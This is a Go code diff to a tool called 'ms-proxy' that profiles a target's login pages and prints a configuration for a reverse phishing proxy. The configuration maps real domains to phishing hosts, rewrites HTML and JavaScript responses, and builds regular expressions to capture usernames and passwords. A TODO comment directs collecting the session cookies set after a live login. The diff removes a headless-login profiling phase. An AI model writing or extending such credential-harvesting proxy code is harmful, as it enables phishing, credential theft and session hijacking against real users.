@@ -92,6 +92,7 @@ func profileTarget(domain string) (*Profile, error) {
 	if chosen == nil {
 		return nil, fmt.Errorf("could not fetch or parse any login page for %s", domain)
 	}
+
 	sort.Strings(chosen.Domains)
 	return chosen, nil
 }
@@ -120,6 +121,7 @@ func fetchAndParse(client *http.Client, rawURL string) (*Profile, error) {
 	if err != nil {
 		return nil, err
 	}
+
 	parseHTML(strings.NewReader(string(body)), finalURL, p)
 	return p, nil
 }
@@ -129,6 +131,7 @@ func parseHTML(body io.Reader, base *url.URL, p *Profile) {
 	if err != nil {
 		return
 	}
+
 	var walk func(*html.Node)
 	walk = func(n *html.Node) {
 		if n.Type == html.ElementNode {
@@ -185,12 +188,14 @@ func (p *Profile) credPatterns() []string {
 			fields = append(fields, f)
 		}
 	}
+
 	var pats []string
 	for _, f := range fields {
 		q := regexp.QuoteMeta(f)
 		pats = append(pats, fmt.Sprintf(`(?i)%s=([^&\s]+)`, q))
 		pats = append(pats, fmt.Sprintf(`(?i)"%s"\s*:\s*"([^"]+)"`, q))
 	}
+
 	if len(pats) == 0 { // no fields found → generic fallback
 		pats = append(pats,
 			`(?i)login=([^&\s]+)`, `(?i)username=([^&\s]+)`,
@@ -237,32 +242,27 @@ func generateConfig(p *Profile, key string) string {
 	fmt.Fprintf(&b, "\t%q: {\n", key)
 	fmt.Fprintf(&b, "\t\tName:           %q,\n", key)
 	fmt.Fprintf(&b, "\t\tEntrySubdomain: %q,\n", phishFor[entryHost])
-
 	fmt.Fprintf(&b, "\t\tHostMap: map[string]string{\n")
 	for _, d := range p.Domains {
 		fmt.Fprintf(&b, "\t\t\t%q: %q,\n", phishFor[d], d)
 	}
 	fmt.Fprintf(&b, "\t\t},\n")
-
 	fmt.Fprintf(&b, "\t\tReverseMap: map[string]string{\n")
 	for _, d := range p.Domains {
 		fmt.Fprintf(&b, "\t\t\t%q: %q,\n", d, phishFor[d])
 	}
 	fmt.Fprintf(&b, "\t\t},\n")
-
 	fmt.Fprintf(&b, "\t\tModifyMimes: map[string]bool{\n")
 	for _, m := range []string{"text/html", "application/json", "application/javascript",
 		"application/x-javascript", "text/javascript", "text/plain"} {
 		fmt.Fprintf(&b, "\t\t\t%q: true,\n", m)
 	}
 	fmt.Fprintf(&b, "\t\t},\n")
-
 	fmt.Fprintf(&b, "\t\tCredPatterns: []*regexp.Regexp{\n")
 	for _, pat := range p.credPatterns() {
 		fmt.Fprintf(&b, "\t\t\tregexp.MustCompile(`%s`),\n", pat)
 	}
 	fmt.Fprintf(&b, "\t\t},\n")
-
 	fmt.Fprintf(&b, "\t\tAuthTokenNames: map[string]bool{\n")
 	fmt.Fprintf(&b, "\t\t\t// TODO: run one live login; add the cookies set on success\n")
 	fmt.Fprintf(&b, "\t\t},\n")
@@ -274,26 +274,23 @@ func generateConfig(p *Profile, key string) string {
 }
 
 // ══════════════════════════════════════════════════════════
-//  CLI ENTRY POINT
 //
-//  ms-proxy -profile -domain <domain> [-key <k>] [-user <u> -pass <p>] [-headful]
+//	CLI ENTRY POINT
 //
-//  Static recon always runs. Supplying -user/-pass adds the dynamic
-//  (headless-login) phase, which fills AuthTokenNames + ServiceUpstream
-//  automatically. Without them you get a static draft (with TODOs).
+//	ms-proxy -profile -domain <domain> [-key <k>]
+//
+//	Static recon only. The headless dynamic phase has been
+//	removed to keep the binary lightweight and deployment simple.
+//
 // ══════════════════════════════════════════════════════════
-
 func runProfiler(args []string) {
 	fs := flag.NewFlagSet("profile", flag.ExitOnError)
 	domain := fs.String("domain", "", "domain to profile")
 	key := fs.String("key", "newtarget", "target key")
-	user := fs.String("user", "", "test username (enables dynamic profiling)")
-	pass := fs.String("pass", "", "test password")
-	headful := fs.Bool("headful", false, "show the browser window")
 	fs.Parse(args)
 
 	if *domain == "" {
-		log.Fatal("usage: ms-proxy -profile -domain <domain> [-key <k>] [-user <u> -pass <p>] [-headful]")
+		log.Fatal("usage: ms-proxy -profile -domain <domain> [-key <k>]")
 	}
 
 	// Phase 1 — static recon
@@ -303,18 +300,6 @@ func runProfiler(args []string) {
 	}
 	fmt.Println(static.report())
 
-	// Phase 2 — dynamic (headless login), only if credentials were supplied
-	var dyn *DynamicProfile
-	if *user != "" && *pass != "" {
-		fmt.Println("\n[*] Running dynamic profile (headless login)…")
-		dyn, err = dynamicProfile(static.FinalURL, *user, *pass, static, !*headful)
-		if err != nil {
-			log.Printf("[!] dynamic profile failed: %v (using static only)", err)
-		} else {
-			fmt.Println(dyn.report())
-		}
-	}
-
 	fmt.Println("\n// ── paste into the `targets` map in config.go ──")
-	fmt.Println(generateConfigFull(static, dyn, *key))
+	fmt.Println(generateConfig(static, *key))
 }
